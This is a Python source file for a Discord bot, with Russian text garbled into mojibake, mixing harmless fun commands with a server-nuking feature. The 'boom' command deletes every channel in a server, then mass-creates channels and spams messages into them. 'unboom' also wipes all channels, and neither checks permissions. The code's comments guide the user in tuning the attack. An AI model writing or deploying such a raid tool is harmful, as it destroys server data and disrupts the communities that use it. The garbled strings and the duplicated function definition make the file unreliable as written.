import nextcord
from nextcord.ext import commands
import random
import asyncio
import requests
import discord
from nextcord.ext.commands import Bot, MemberConverter
from datetime import datetime

intents = nextcord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='/', intents=intents) 

start_time = datetime.now()

async def log_command(ctx):
    line = "----------------------------------------"
    command_info = (
        f"\n{line}\n"
        f"–ö–æ–º–∞–Ω–¥–∞: {ctx.message.content}\n"
        f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {ctx.author} (ID: {ctx.author.id})\n"
        f"–ö–∞–Ω–∞–ª: {ctx.channel} (ID: {ctx.channel.id})\n"
        f"–°–µ—Ä–≤–µ—Ä: {ctx.guild.name if ctx.guild else 'Direct Message'} (ID: {ctx.guild.id if ctx.guild else 'N/A'})\n"
        f"–í—Ä–µ–º—è: {datetime.now()}\n"
        f"ID –°–æ–æ–±—â–µ–Ω–∏—è: {ctx.message.id}\n" 
        f"{line}"
    )
    print(command_info)


# –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–æ–±—ã—Ç–∏—è on_command_completion, –∫–æ—Ç–æ—Ä–æ–µ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è, –∫–æ–≥–¥–∞ –∫–æ–º–∞–Ω–¥–∞ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞
@bot.event
async def on_command_completion(ctx):
    await log_command(ctx)

@bot.command()
async def uptime(ctx):
    delta_time = datetime.now() - start_time
    await ctx.send(f"–ë–æ—Ç –±—ã–ª –∑–∞–ø—É—â–µ–Ω {delta_time.days} –¥–Ω–µ–π, {delta_time.seconds // 3600} —á–∞—Å–æ–≤, {delta_time.seconds // 60 % 60} –º–∏–Ω—É—Ç –∏ {delta_time.seconds % 60} —Å–µ–∫—É–Ω–¥ –Ω–∞–∑–∞–¥.")

@bot.command()
async def kiss(ctx):
    if ctx.message.mentions:   
        await ctx.send(f"{ctx.author.mention} –ø–æ—Ü–µ–ª–æ–≤–∞–ª {ctx.message.mentions[0].mention} ")    

@bot.command()
async def rps(ctx, choice):
    choices = ["–∫–∞–º–µ–Ω—å", "–Ω–æ–∂–Ω–∏—Ü—ã", "–±—É–º–∞–≥–∞"]
    bot_choice = random.choice(choices)

    if choice.lower() in choices:
        if choice.lower() == bot_choice:
            result = "–ù–∏—á—å—è!"
        elif (choice.lower() == "–∫–∞–º–µ–Ω—å" and bot_choice == "–Ω–æ–∂–Ω–∏—Ü—ã") or \
             (choice.lower() == "–Ω–æ–∂–Ω–∏—Ü—ã" and bot_choice == "–±—É–º–∞–≥–∞") or \
             (choice.lower() == "–±—É–º–∞–≥–∞" and bot_choice == "–∫–∞–º–µ–Ω—å"):
            result = f"–í—ã –ø–æ–±–µ–¥–∏–ª–∏! –ë–æ—Ç –≤—ã–±—Ä–∞–ª {bot_choice}"
        else:
            result = f"–ë–æ—Ç –ø–æ–±–µ–¥–∏–ª! –ë–æ—Ç –≤—ã–±—Ä–∞–ª {bot_choice}"
    else:
        result = "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –æ–¥–∏–Ω –∏–∑: –∫–∞–º–µ–Ω—å, –Ω–æ–∂–Ω–∏—Ü—ã, –±—É–º–∞–≥–∞"

    await ctx.send(result)

@bot.command()
async def userinfo(ctx, member: str):
    try:
        pr = ''
        converter = MemberConverter()
        member = await converter.convert(ctx, member)
        
        user_embed = discord.Embed(
            title=f'{pr} –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ',
            colour=discord.Color(int('FF0000', 16)),
            timestamp=datetime.now()
        )
        user_embed.set_thumbnail(url=member.avatar.url)
        user_embed.add_field(name='–ò–º—è', value=member.display_name, inline=False)
        user_embed.add_field(name='ID –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è', value=member.id, inline=False)
        user_embed.add_field(name='–ü—Ä–∏—Å–æ–µ–¥–∏–Ω–∏–ª—Å—è', value=member.joined_at.strftime('%d-%m-%Y %H:%M:%S'), inline=False)
        user_embed.add_field(name='–ê–∫–∫–∞—É–Ω—Ç —Å–æ–∑–¥–∞–Ω', value=member.created_at.strftime('%d-%m-%Y %H:%M:%S'), inline=False)
        user_embed.add_field(name="–†–æ–ª—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ", value=f"{member.top_role.mention}", inline=False)
        user_embed.set_footer(text='–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ',)
        await ctx.send(embed=user_embed)

    except discord.ext.commands.errors.MemberNotFound:
        await ctx.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.')
    
    except Exception as e:
        print('–í–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞:', e)
        error_message = f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}'
        await ctx.send(error_message)

@bot.command()
async def unboom(ctx):
    guild = ctx.guild
    await delete_all_channels(guild)

async def delete_all_channels(guild):
    for channel in guild.channels:
                    await channel.delete()

@bot.command()
async def boom(ctx, num_channels=100, num_messages=100):  # —Ç—É—Ç –≤–≤–æ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–∞–Ω–∞–ª–æ–≤(num_channels) —Å–∫–æ–ª—å–∫–æ –∫–∞–Ω–∞–ª–æ–≤ –≤—ã —Ö–æ—Ç–∏—Ç–µ —Å–æ–∑–¥–∞—Ç—å –∏ –∫–æ–ª–≤–æ —Å–æ–æ–±—â–µ–Ω–∏–π(num_messages)
    guild = ctx.guild
    await asyncio.gather(delete_all_channels(guild), create_channels(guild, num_channels, num_messages))

async def delete_all_channels(guild):
    await asyncio.gather(*[channel.delete() for channel in guild.channels])

async def create_channels(guild, num_channels, num_messages):
    tasks = []
    for i in range(num_channels):
        channel_name = f'123' # —Ç—É—Ç –±—É–¥–µ—Ç –Ω–∞–∑–≤–∞–Ω–∏–µ –∫–∞–Ω–∞–ª–æ–≤
        tasks.append(send_messages(guild, channel_name, num_messages))

    await asyncio.gather(*tasks)

async def send_messages(guild, channel_name, num_messages):
    channel = await guild.create_text_channel(channel_name)
    
    for i in range(num_messages):
        await channel.send('boomü¶ß')     # —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –∫–æ—Ç–æ—Ä–æ–µ –±—É–¥–µ—Ç –≤ –∫–∞–Ω–∞–ª–∞—Ö           

bot.run('TOKEN') # —Ç—É—Ç –≤–∞—à —Ç–æ–∫–µ–Ω
